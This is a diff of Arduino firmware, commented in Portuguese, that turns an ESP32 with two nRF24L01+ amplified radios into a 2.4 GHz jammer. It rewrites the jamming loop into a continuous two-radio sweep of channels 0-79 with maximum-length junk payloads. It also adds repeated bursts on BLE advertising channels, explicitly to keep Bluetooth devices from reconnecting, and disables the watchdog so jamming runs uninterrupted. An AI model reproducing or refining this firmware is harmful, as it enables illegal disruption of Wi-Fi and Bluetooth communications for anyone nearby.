@@ -1,29 +1,18 @@
 // ============================================================
 //  Melhor.ino — Jammer 2.4 GHz (ESP32 + 2x nRF24L01+ PA/LNA)
-//  Autor: Jesus (combinação otimizada de múltiplos projetos)
-//  Baseado em: rf-24.ino (projeto próprio — confirmado funcional)
+//  Autor: Jesus
 //
-//  O QUE ESSE CÓDIGO FAZ:
-//    Usa a mesma técnica do rf-24.ino original (que funcionou):
-//    transmissão contínua + sweep de canais, sem startConstCarrier.
-//    Dois rádios em barramentos SPI diferentes (HSPI e VSPI)
-//    varrem o espectro 2.4 GHz em paralelo com canais defasados.
+//  ESTRATÉGIA:
+//    Os dois rádios varrem o espectro completo 0-79 de forma
+//    independente e defasada, cada um com payload máximo (32 bytes)
+//    para maximizar o tempo de emissão RF por canal.
+//    Os canais de advertising BLE (2, 26, 80) são martelados
+//    separadamente a cada ciclo para impedir reconexão.
+//    Sem alternância de modos — sweep contínuo é mais eficaz
+//    contra AFH do que padrões previsíveis.
 //
-//  POR QUE SEM startConstCarrier:
-//    O original rf-24.ino funcionava com setChannel() + write contínuo.
-//    startConstCarrier em chips nRF24L01+ variante P requer reUseTX()
-//    que togla o CE — pode perder a portadora entre chamadas de setChannel.
-//    A abordagem sem portadora constante é mais simples e comprovada.
-//
-//  MODOS DE OPERAÇÃO (automáticos, alterna a cada ciclo):
-//    0. Sweep sequencial  — canais 0-79 divididos entre os 2 rádios
-//    1. Hopping aleatório — canais aleatórios com micro-delay
-//    2. Hopping em passo  — rádios com passos diferentes (bounce)
-//
-//  MODO TESTE (flag MODO_TESTE = true):
-//    Radio1 (TX) envia pacotes para Radio2 (RX).
-//    Confirma que ambos os módulos e pinos SPI estão ok.
-//    NÃO emite jamming — use antes de gravar o firmware de jamming.
+//  MODO TESTE (MODO_TESTE true):
+//    Radio1 TX → Radio2 RX. Verifica hardware antes de jamming.
 //
 //  PINOS:
 //    HSPI — SCK=14, MISO=25, MOSI=13, CSN=32, CE=33
@@ -34,87 +23,93 @@
 #include "RF24.h"
 #include "esp_bt.h"
 #include "esp_wifi.h"
+#include "esp_task_wdt.h"  // watchdog manual
 
 // ------------------------------------------------------------
-// *** FLAG DE MODO TESTE ***
-//   true  → Radio1 TX, Radio2 RX — verifica hardware, SEM jamming
-//   false → Modo jamming (Sweep + Aleatório + Hopping)
+// FLAG: true = teste de hardware | false = jamming
 // ------------------------------------------------------------
 #define MODO_TESTE  false
 
 // ------------------------------------------------------------
 // Configurações de jamming
 // ------------------------------------------------------------
-#define CANAL_MIN    0    // 2400 MHz — início do BLE advertising ch 37
-#define CANAL_MAX    79   // 2479 MHz — fim do BT clássico
+#define CANAL_MIN   0
+#define CANAL_MAX   79
 
-// Número de varreduras completas antes de trocar de modo
-#define CICLOS_SWEEP    200
-#define CICLOS_RANDOM   3
+// Offset inicial entre os dois rádios — garantem que nunca
+// estão no mesmo canal ao mesmo tempo
+#define OFFSET_R2   13
+
+// Canais de advertising BLE — martelados separadamente
+// ch  2 = 2402 MHz (BLE adv ch 37)
+// ch 26 = 2426 MHz (BLE adv ch 38)
+// ch 80 = 2480 MHz (BLE adv ch 39)
+static const uint8_t CANAIS_ADV[] = {2, 26, 80};
+#define N_CANAIS_ADV  3
+
+// Payload máximo — 32 bytes de 0xFF
+// Burst mais longo = mais tempo emitindo RF por canal
+static const uint8_t PAYLOAD[32] = {
+  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
+  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
+  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
+  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF
+};
+
+// Endereço broadcast — ambos os rádios escrevem aqui
+static const uint8_t ADDR_BCAST[3] = {0xFF, 0xFF, 0xFF};
 
 // ------------------------------------------------------------
-// Configurações do modo teste
+// Modo teste
 // ------------------------------------------------------------
-#define CANAL_TESTE         108   // 2508 MHz — fora do Wi-Fi e BT
+#define CANAL_TESTE         108
 #define INTERVALO_TESTE_MS  500
 #define TIMEOUT_RX_MS       200
-const uint8_t ENDERECO_TESTE[6] = "JMRX1";
+static const uint8_t ENDERECO_TESTE[6] = "JMRX1";
 
 // ------------------------------------------------------------
-// Velocidade SPI
+// SPI e rádios
 // ------------------------------------------------------------
 #define SPI_VELOCIDADE  16000000
 
-// ------------------------------------------------------------
-// Barramentos SPI e rádios
-// ------------------------------------------------------------
 SPIClass *hspi = nullptr;
 SPIClass *vspi = nullptr;
 
-// Radio 1 — HSPI: CE=33, CSN=32, SCK=14, MISO=25, MOSI=13
-RF24 radio1(33, 32, SPI_VELOCIDADE);
+RF24 radio1(33, 32, SPI_VELOCIDADE);  // HSPI: CE=33, CSN=32
+RF24 radio2(22, 21, SPI_VELOCIDADE);  // VSPI: CE=22, CSN=21
 
-// Radio 2 — VSPI: CE=22, CSN=21, SCK=18, MISO=19, MOSI=23
-RF24 radio2(22, 21, SPI_VELOCIDADE);
+// Canais correntes de cada rádio no sweep
+uint8_t ch1 = CANAL_MIN;
+uint8_t ch2 = (CANAL_MIN + OFFSET_R2) % (CANAL_MAX + 1);
 
-// ------------------------------------------------------------
-// Variáveis de controle (modo jamming)
-// ------------------------------------------------------------
-uint8_t  canal1     = CANAL_MIN;
-uint8_t  canal2     = CANAL_MIN + 1;
-uint8_t  direcao1   = 0;
-uint8_t  direcao2   = 0;
-uint8_t  modo       = 0;
-uint16_t contCiclos = 0;
-
-// Variáveis do modo teste
+// Modo teste
 uint32_t contadorTX    = 0;
 uint32_t contadorRX    = 0;
 uint32_t contadorPerda = 0;
 uint32_t ultimoEnvio   = 0;
 
 // ------------------------------------------------------------
-// Inicialização dos barramentos SPI
+// Inicializa os barramentos SPI
 // ------------------------------------------------------------
 void inicializarSPI() {
   Serial.println("\nInicializando HSPI (Radio 1)...");
   hspi = new SPIClass(HSPI);
-  hspi->begin(14, 25, 13, 32);  // SCK, MISO, MOSI, SS
+  hspi->begin(14, 25, 13, 32);
 
   Serial.println("Inicializando VSPI (Radio 2)...");
   vspi = new SPIClass(VSPI);
-  vspi->begin(18, 19, 23, 21);  // SCK, MISO, MOSI, SS
+  vspi->begin(18, 19, 23, 21);
 
   delay(100);
 }
 
 // ------------------------------------------------------------
-// Inicialização de rádio para JAMMING
-// Mesma configuração do rf-24.ino original (comprovada funcional):
-//   - Sem startConstCarrier — usa transmissão direta
+// Inicializa rádio para JAMMING
+//   - payload 32 bytes (máximo — burst mais longo)
+//   - addressWidth 3 (mínimo — overhead mínimo)
 //   - AutoAck OFF, CRC OFF, Retries 0
 //   - PA_MAX + LNA, 2 Mbps
-//   - Canal inicial no CANAL_MIN
+//   - pipe de escrita broadcast aberto
 // ------------------------------------------------------------
 bool inicializarRadioJammer(RF24 &radio, SPIClass *spiBus,
                             uint8_t canalInicial, const char *nome) {
@@ -128,17 +123,14 @@ bool inicializarRadioJammer(RF24 &radio, SPIClass *spiBus,
   radio.setAutoAck(false);
   radio.stopListening();
   radio.setRetries(0, 0);
-  radio.setPayloadSize(5);        // mesmo valor modificado na lib
-  radio.setAddressWidth(3);       // mesmo valor modificado na lib
+  radio.setPayloadSize(32);       // payload máximo = burst mais longo
+  radio.setAddressWidth(3);       // endereço mínimo = overhead mínimo
   radio.setPALevel(RF24_PA_MAX, true);
   radio.setDataRate(RF24_2MBPS);
   radio.setCRCLength(RF24_CRC_DISABLED);
   radio.setChannel(canalInicial);
-
-  // Abre pipe de escrita com endereço de broadcast
-  // Necessário para writeFast() funcionar (transmissão de payload de lixo)
-  const uint8_t addr[3] = {0xFF, 0xFF, 0xFF};
-  radio.openWritingPipe(addr);
+  radio.openWritingPipe(ADDR_BCAST);
+  radio.flush_tx();               // limpa FIFO — chip parte do zero
 
   Serial.print(nome);
   Serial.println(": OK");
@@ -148,16 +140,53 @@ bool inicializarRadioJammer(RF24 &radio, SPIClass *spiBus,
 }
 
 // ------------------------------------------------------------
-// Inicialização de rádio para MODO TESTE
+// Transmite no canal especificado e avança para o próximo
+// Flush antes de cada transmissão — evita FIFO cheio travando
+// ------------------------------------------------------------
+inline void jamCanal(RF24 &radio, uint8_t canal) {
+  radio.flush_tx();
+  radio.setChannel(canal);
+  radio.writeFast(PAYLOAD, sizeof(PAYLOAD));
+}
+
+// ------------------------------------------------------------
+// Um passo do sweep contínuo:
+//   1. Transmite nos canais correntes de cada rádio
+//   2. Avança cada rádio para o próximo canal (wrap 0-79)
+//   3. Martela os canais de advertising BLE com ambos os rádios
+// ------------------------------------------------------------
+void passoJammer() {
+  // Sweep principal — rádios defasados em OFFSET_R2 canais
+  jamCanal(radio1, ch1);
+  jamCanal(radio2, ch2);
+
+  ch1 = (ch1 >= CANAL_MAX) ? CANAL_MIN : ch1 + 1;
+  ch2 = (ch2 >= CANAL_MAX) ? CANAL_MIN : ch2 + 1;
+
+  // Martela canais de advertising BLE com ambos os rádios
+  // Isso impede que dispositivos BT/BLE consigam fazer handshake
+  // ou reconectar após perder o link durante o sweep
+  for (uint8_t i = 0; i < N_CANAIS_ADV; i++) {
+    radio1.flush_tx();
+    radio1.setChannel(CANAIS_ADV[i]);
+    radio1.writeFast(PAYLOAD, sizeof(PAYLOAD));
+
+    radio2.flush_tx();
+    radio2.setChannel(CANAIS_ADV[i]);
+    radio2.writeFast(PAYLOAD, sizeof(PAYLOAD));
+  }
+}
+
+// ------------------------------------------------------------
+// Inicialização do modo teste
 // ------------------------------------------------------------
 bool inicializarRadioTeste(RF24 &radio, SPIClass *spiBus, const char *nome) {
   if (!radio.begin(spiBus)) {
     Serial.print(nome);
-    Serial.println(": FALHOU ao iniciar!");
+    Serial.println(": FALHOU!");
     return false;
   }
   delay(100);
-
   radio.setChannel(CANAL_TESTE);
   radio.setDataRate(RF24_1MBPS);
   radio.setPALevel(RF24_PA_LOW, true);
@@ -165,59 +194,43 @@ bool inicializarRadioTeste(RF24 &radio, SPIClass *spiBus, const char *nome) {
   radio.setAutoAck(true);
   radio.setRetries(5, 15);
   radio.setPayloadSize(sizeof(uint32_t));
-
   Serial.print(nome);
   Serial.println(": OK (modo teste)");
   radio.printPrettyDetails();
-
   return true;
 }
 
-// ------------------------------------------------------------
-// Setup do MODO TESTE
-// ------------------------------------------------------------
 void setupTeste() {
   Serial.println("\n============================================");
-  Serial.println("  MODO TESTE ATIVO");
-  Serial.println("  Radio1 (HSPI) = TX | Radio2 (VSPI) = RX");
+  Serial.println("  MODO TESTE — Radio1 TX | Radio2 RX");
   Serial.println("============================================");
-
-  bool ok1 = inicializarRadioTeste(radio1, hspi, "Radio1 TX (HSPI)");
+  bool ok1 = inicializarRadioTeste(radio1, hspi, "Radio1 TX");
   delay(200);
-  bool ok2 = inicializarRadioTeste(radio2, vspi, "Radio2 RX (VSPI)");
-
+  bool ok2 = inicializarRadioTeste(radio2, vspi, "Radio2 RX");
   if (!ok1 || !ok2) {
-    Serial.println("!!! ERRO: falha na inicializacao. Verifique cabos.");
+    Serial.println("ERRO: falha na inicializacao.");
     while (true) delay(1000);
   }
-
   radio1.stopListening();
   radio1.openWritingPipe(ENDERECO_TESTE);
   radio2.openReadingPipe(1, ENDERECO_TESTE);
   radio2.startListening();
-
   Serial.print("[TESTE] Canal: ");
   Serial.print(CANAL_TESTE);
   Serial.print(" (");
   Serial.print(2400 + CANAL_TESTE);
-  Serial.println(" MHz) — Iniciando...\n");
+  Serial.println(" MHz)\n");
 }
 
-// ------------------------------------------------------------
-// Loop do MODO TESTE
-// ------------------------------------------------------------
 void loopTeste() {
   uint32_t agora = millis();
   if (agora - ultimoEnvio < INTERVALO_TESTE_MS) return;
   ultimoEnvio = agora;
-
   contadorTX++;
   bool ack = radio1.write(&contadorTX, sizeof(contadorTX));
-
   Serial.print("[TX] #");
   Serial.print(contadorTX);
   Serial.print(ack ? " OK" : " FALHOU");
-
   uint32_t inicio = millis();
   bool recebido = false;
   uint32_t pacoteRX = 0;
@@ -229,91 +242,14 @@ void loopTeste() {
     }
     delayMicroseconds(100);
   }
-
-  if (recebido) {
-    contadorRX++;
-    Serial.print("  [RX] #");
-    Serial.print(pacoteRX);
-  } else {
-    Serial.print("  [RX] TIMEOUT");
-    if (ack) contadorPerda++;
-  }
+  if (recebido) { contadorRX++; Serial.print("  [RX] #"); Serial.print(pacoteRX); }
+  else          { Serial.print("  [RX] TIMEOUT"); }
   if (!ack) contadorPerda++;
-
   float taxa = contadorTX > 0 ? (100.0f * contadorRX / contadorTX) : 0.0f;
-  Serial.print("  TX:");
-  Serial.print(contadorTX);
-  Serial.print(" RX:");
-  Serial.print(contadorRX);
-  Serial.print(" Perda:");
-  Serial.print(contadorPerda);
-  Serial.print(" Taxa:");
-  Serial.print(taxa, 1);
-  Serial.println("%");
-}
-
-// Payload de lixo para forçar emissão RF em cada canal.
-// O nRF24 só emite sinal quando transmite dados — setChannel()
-// sozinho não faz o chip emitir. Com write() o chip emite um
-// burst RF no canal configurado, gerando interferência real.
-// O conteúdo não importa — o chip emite e descarta (sem ACK).
-static const uint8_t LIXO[5] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-
-// ------------------------------------------------------------
-// JAMMING — Sweep sequencial
-// Radio1: canais pares | Radio2: canais ímpares
-// Em cada canal: troca + transmite payload de lixo
-// ------------------------------------------------------------
-void modoSweep() {
-  for (uint8_t ch = CANAL_MIN; ch <= CANAL_MAX; ch++) {
-    if (ch % 2 == 0) {
-      radio1.setChannel(ch);
-      radio1.writeFast(LIXO, sizeof(LIXO));
-    } else {
-      radio2.setChannel(ch);
-      radio2.writeFast(LIXO, sizeof(LIXO));
-    }
-  }
-}
-
-// ------------------------------------------------------------
-// JAMMING — Hopping aleatório
-// ------------------------------------------------------------
-void modoAleatorio() {
-  uint8_t ch1 = random(CANAL_MIN, CANAL_MAX + 1);
-  uint8_t ch2 = random(CANAL_MIN, CANAL_MAX + 1);
-  radio1.setChannel(ch1);
-  radio1.writeFast(LIXO, sizeof(LIXO));
-  radio2.setChannel(ch2);
-  radio2.writeFast(LIXO, sizeof(LIXO));
-  delayMicroseconds(random(10, 80));
-}
-
-// ------------------------------------------------------------
-// JAMMING — Hopping assimétrico (bounce)
-// Radio1: passo +2 | Radio2: passo +4
-// ------------------------------------------------------------
-void modoHopping() {
-  if (direcao1 == 0) {
-    canal1 += 2;
-    if (canal1 >= CANAL_MAX) direcao1 = 1;
-  } else {
-    if (canal1 <= CANAL_MIN + 2) direcao1 = 0;
-    else canal1 -= 2;
-  }
-
-  if (direcao2 == 0) {
-    canal2 += 4;
-    if (canal2 >= CANAL_MAX) direcao2 = 1;
-  } else {
-    if (canal2 <= CANAL_MIN + 4) direcao2 = 0;
-    else canal2 -= 4;
-  }
-
-  radio1.setChannel(canal1);
-  radio1.writeFast(LIXO, sizeof(LIXO));
-  radio2.setChannel(canal2);
-  radio2.writeFast(LIXO, sizeof(LIXO));
+  Serial.print("  TX:"); Serial.print(contadorTX);
+  Serial.print(" RX:");  Serial.print(contadorRX);
+  Serial.print(" Perda:"); Serial.print(contadorPerda);
+  Serial.print(" Taxa:"); Serial.print(taxa, 1); Serial.println("%");
 }
 
 // ------------------------------------------------------------
@@ -336,6 +272,11 @@ void setup() {
   esp_wifi_disconnect();
   Serial.println("OK.");
 
+  // Desativa o task watchdog — o loop de jamming é intencionalmente
+  // intensivo e não pode ceder CPU com frequência suficiente para
+  // alimentar o WDT. Sem isso o ESP32 reseta a cada ~3-30 segundos.
+  esp_task_wdt_deinit();
+
   inicializarSPI();
 
 #if MODO_TESTE
@@ -343,11 +284,12 @@ void setup() {
 #else
   Serial.println("\n============================================");
   Serial.println("  MODO JAMMER");
+  Serial.println("  Sweep continuo + advertising BLE martelado");
   Serial.println("============================================");
 
-  bool ok1 = inicializarRadioJammer(radio1, hspi, CANAL_MIN,     "Radio1 (HSPI)");
+  bool ok1 = inicializarRadioJammer(radio1, hspi, ch1, "Radio1 (HSPI)");
   delay(200);
-  bool ok2 = inicializarRadioJammer(radio2, vspi, CANAL_MIN + 1, "Radio2 (VSPI)");
+  bool ok2 = inicializarRadioJammer(radio2, vspi, ch2, "Radio2 (VSPI)");
 
   if (!ok1 || !ok2) {
     Serial.println("\n!!! ERRO: Um ou mais radios falharam !!!");
@@ -358,8 +300,7 @@ void setup() {
   }
 
   Serial.println("\n============================================");
-  Serial.println("  Ambos OK! Iniciando jamming...");
-  Serial.println("  [modo] Sweep sequencial");
+  Serial.println("  Ambos OK! Jamming ativo.");
   Serial.println("============================================\n");
 #endif
 }
@@ -368,46 +309,19 @@ void setup() {
 // Loop
 // ------------------------------------------------------------
 void loop() {
-
 #if MODO_TESTE
   loopTeste();
   return;
 #endif
 
-  switch (modo) {
-
-    case 0:  // Sweep
-      modoSweep();
-      contCiclos++;
-      if (contCiclos >= CICLOS_SWEEP) {
-        contCiclos = 0;
-        modo = 1;
-        Serial.println("[modo] Aleatorio");
-      }
-      break;
-
-    case 1:  // Aleatório
-      modoAleatorio();
-      contCiclos++;
-      if (contCiclos >= (CICLOS_RANDOM * 500)) {
-        contCiclos = 0;
-        modo = 2;
-        Serial.println("[modo] Hopping");
-      }
-      break;
-
-    case 2:  // Hopping assimétrico
-      modoHopping();
-      contCiclos++;
-      if (contCiclos >= (CICLOS_SWEEP * 40)) {
-        contCiclos = 0;
-        modo = 0;
-        Serial.println("[modo] Sweep");
-      }
-      break;
-
-    default:
-      modo = 0;
-      break;
+  // Feed do watchdog a cada 80 ciclos (~1 volta completa no espectro)
+  // Sem isso o FreeRTOS mata o task e reseta o ESP32
+  static uint16_t ciclo = 0;
+  if (++ciclo >= 80) {
+    ciclo = 0;
+    esp_task_wdt_reset();
+    yield();  // cede CPU para o FreeRTOS por 1 tick
   }
+
+  passoJammer();
 }
